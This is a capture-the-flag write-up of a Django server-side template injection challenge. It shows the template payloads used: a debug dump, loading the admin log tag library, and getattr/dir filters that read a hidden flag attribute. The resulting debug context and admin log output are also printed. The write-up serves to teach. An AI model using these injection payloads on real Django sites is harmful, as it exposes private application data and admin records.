# Shia Labeouf-off!

One of my teammates mentioned that it was a template injection, so I focused on the ad-lib page.

**http://web.chal.csaw.io:5490/ad-lib/**

So first thing to do was look at what templates we could use, using the [Django Documentation for Built in Template and Filter Tags](https://docs.djangoproject.com/en/1.11/ref/templates/builtins/)

Unfortunately, the only useful ones were
```
{% debug %}
{% load somelibrary %}
{% load sometag from somelibrary %}
```
We can clean up the debug ouput adding a force_escape filter and pre tags:
```
<pre>{% filter force_escape %} {% debug %} {% endfilter %}</pre>
```
Which gives us the following:
```
{'block': <Block Node: content. Contents: [<TextNode: u'\n<pre>'>
<django.template.defaulttags.FilterNode object at 0x7f135efbb3d0>
<TextNode: u'</pre>\n'>]>}{'block': <Block Node: body. Contents:
[<TextNode: u'\n<div class="container">\n'>,
<Block Node: content. Contents: [<TextNode: u'\n            <h1>Example '>]>,
<TextNode: u'\n\n        </div>\n    </di'>]>}{}
{'DEFAULT_MESSAGE_LEVELS': {'DEBUG': 10,
                            'ERROR': 40,
                            'INFO': 20,
                            'SUCCESS': 25,
                            'WARNING': 30},
    u'csrf_token': <SimpleLazyObject: <function _get_val at 0x7f135ef32d70>>,
    'messages': <django.contrib.messages.storage.fallback.FallbackStorage object at 0x7f135efbb7d0>,
    'perms': <django.contrib.auth.context_processors.PermWrapper object at 0x7f135ef61350>,
    u'request': <WSGIRequest: POST '/ad-lib/'>,
    'user': <SimpleLazyObject: <function <lambda> at 0x7f135ef32de8>>}
    {'adjective': '<img src="https://media1.giphy.com/media/TxXhUgEUWWL6/200.webp#129-grid1" />',
    'mrpoopy': <ad-lib.someclass.Woohoo instance at 0x7f135f1136c8>,
    'noun': '<img src="https://media0.giphy.com/media/arNexgslLkqVq/200.webp#70-grid1" />',
    'verb': '<img src="https://media3.giphy.com/media/R0vQH2T9T4zza/200.webp#165-grid1" />'}{'False': False, 'None': None, 'True': True}
```
Note: While debug gives us both the current context and the imported modules, I excluded the module section because it's very long.

While looking at the debug output, out of the very long list of modules, I noticed that template tags were being imported, and decided to try importing some of these.

While attempting to load adlib_extras, I accidentally misspelled it and received an error page:
```
TemplateSyntaxError at /ad-lib/
'adlib_extra' is not a registered tag library. Must be one of:
adlib_extras
admin_list
admin_modify
admin_static
admin_urls
cache
i18n
l10n
log
pools_extras
static
staticfiles
tz
```
Huh, maybe I can enumerate tags in a library using the version of load that loads a specific tag?
```
TemplateSyntaxError at /ad-lib/
'test' is not a valid tag or filter in tag library 'pools_extras'
```
I verified it's not possible to do by examining the Django source code. Oddly enough, they choose to enumerate the tag libraries available, but not the tags in the individual libraries.

However, it dawned on me that while Django's documentation does list the normal built in template tags, the documentation does not list some of the ones I expected to see, and realized that the documentation did not list ones imported from modules, so I started combing the source for more template tags.

After looking through the source, I found what I was looking for, the template tags for the admin module:

[https://github.com/django/django/blob/master/django/contrib/admin/templatetags/log.py](https://github.com/django/django/blob/master/django/contrib/admin/templatetags/log.py)

I was then able to write my own crude implementation of the Django admin log.
```
{% load log %}
{% get_admin_log 1000 as admin_log %}
<ul>
{% for gLog in admin_log %}
<li>{{gLog.user}} {{gLog.content_type}} {{gLog.object_id}} {{gLog.object_repr}} {{gLog.action_flag}} {{gLog.change_message}} {{gLog.action_time}}</li>
{% endfor %}
</ul>
```
Which gives us this:
```
admin poll 3 asdf 1 [{"added": {}}] Sept. 13, 2017, 8:08 p.m.
admin poll 1 Which one would you take into battle? 2 Changed question. Sept. 13, 2017, 2:55 a.m.
admin poll 2 Who is the most Shia of them all? 2 Changed question. Sept. 13, 2017, 2:55 a.m.
admin choice 8 https://media0.giphy.com/media/SPWzxnP0ga2t2/200w.webp#124-grid3 1 Sept. 13, 2017, 2:54 a.m.
admin choice 7 https://media0.giphy.com/media/l2JdV73x6Ifdub8ly/200.webp#93-grid3 1 Sept. 13, 2017, 2:54 a.m.
admin choice 6 https://media2.giphy.com/media/Oh4URwX1apHws/200.webp#66-grid3 1 Sept. 13, 2017, 2:51 a.m.
admin choice 5 https://media3.giphy.com/media/KCd6BFerCh3TG/200.webp#58-grid3 1 Sept. 13, 2017, 2:51 a.m.
admin choice 4 https://media2.giphy.com/media/MVCqaCH3Dzt3q/200.webp#52-grid3 1 Sept. 13, 2017, 2:51 a.m.
admin choice 3 https://media0.giphy.com/media/xT5LMvK0kjdURtXa48/200.webp#38-grid3 1 Sept. 13, 2017, 2:51 a.m.
admin choice 2 https://media3.giphy.com/media/3orifeHgibcQp6tZrG/200.webp#41-grid3 2 No fields changed. Sept. 13, 2017, 2:50 a.m.
admin choice 2 https://media3.giphy.com/media/3orifeHgibcQp6tZrG/200.webp#41-grid3 2 Changed choice_text. Sept. 13, 2017, 2:50 a.m.
admin choice 2 https://media2.giphy.com/media/3oz8xFfwgt4ncWYtva/200.webp#17-grid3 2 Changed choice_text. Sept. 13, 2017, 2:50 a.m.
admin choice 2 https://media3.giphy.com/media/l2Je4rm0DCduJ6QJG/200.webp#16-grid3 1 Sept. 13, 2017, 2:50 a.m.
admin choice 1 https://media2.giphy.com/media/3o7TKP9ln2Dr6ze6f6/giphy.gif 1 Sept. 13, 2017, 2:49 a.m.
admin choice 1 Green 3 Sept. 13, 2017, 2:47 a.m.
admin choice 2 Blue 3 Sept. 13, 2017, 2:47 a.m.
admin choice 3 Red 3 Sept. 13, 2017, 2:47 a.m.
admin choice 4 Yellow 3 Sept. 13, 2017, 2:47 a.m.
admin choice 5 Black 3 Sept. 13, 2017, 2:47 a.m.
admin choice 6 Orange 3 Sept. 13, 2017, 2:47 a.m.
admin choice 7 Other 3 Sept. 13, 2017, 2:47 a.m.
admin choice 8 Paul 3 Sept. 13, 2017, 2:47 a.m.
admin choice 9 John 3 Sept. 13, 2017, 2:47 a.m.
admin choice 10 RIngo 3 Sept. 13, 2017, 2:47 a.m.
admin choice 11 George 3 Sept. 13, 2017, 2:47 a.m.
admin poll 1 What is your favorite color 2 Changed question. Aug. 16, 2013, 1:08 p.m.
admin poll 2 Favorite Beatle 2 Changed question. Aug. 16, 2013, 1:08 p.m.
admin poll 2 Favorite Beatle? 1 Aug. 16, 2013, 1:08 p.m.
admin poll 1 What is your favorite color? 1 Aug. 16, 2013, 11:22 a.m.
```
Unfortunately, the flag was not in here, but upon looking at the log, I noticed that there was a third poll, even though there were only 2 polls on the poll page. That seemed odd, so I decided to check it out.

**http://web.chal.csaw.io:5490/polls/3/**

Visiting this 3rd poll gives us an exception, but in the traceback, I noticed that the traceback gives us some of the code in **./polls/templatetags/pools_extras.py**, which you'll recognize from the earlier debug output.
```
@register.filter(name='getme')
def getme(value, arg):
    return getattr(value, arg)
@register.filter(name='checknum')
def checknum(value):
    check(value) 
@register.filter(name='listme')
def listme(value):
    return dir(value)
def check(value):
    if value > 2:
        raise Exception("Our infrastructure can't support that many Shias!")
```
Having spent the last couple hours learning Django template tags and filters, I recognized these as Django template filter definitions, exposing some python functions, **dir** and **getattr**.

It became pretty clear that I was to use these to get the flag, but from where? Going to back to the debug context output, **mrpoopy** stands out as exposing a class.
```
{{mrpoopy | listme}}
```
Which shows us the the attributes of mrpoopy:
```	
['Woohoo', '__doc__', '__flag__', '__module__']
```	
Now we know where the flag is, let's get it:
```
{{mrpoopy | getme:"__flag__" }}
```	
Which gives us the flag:
```
flag{wow_much_t3mplate}
```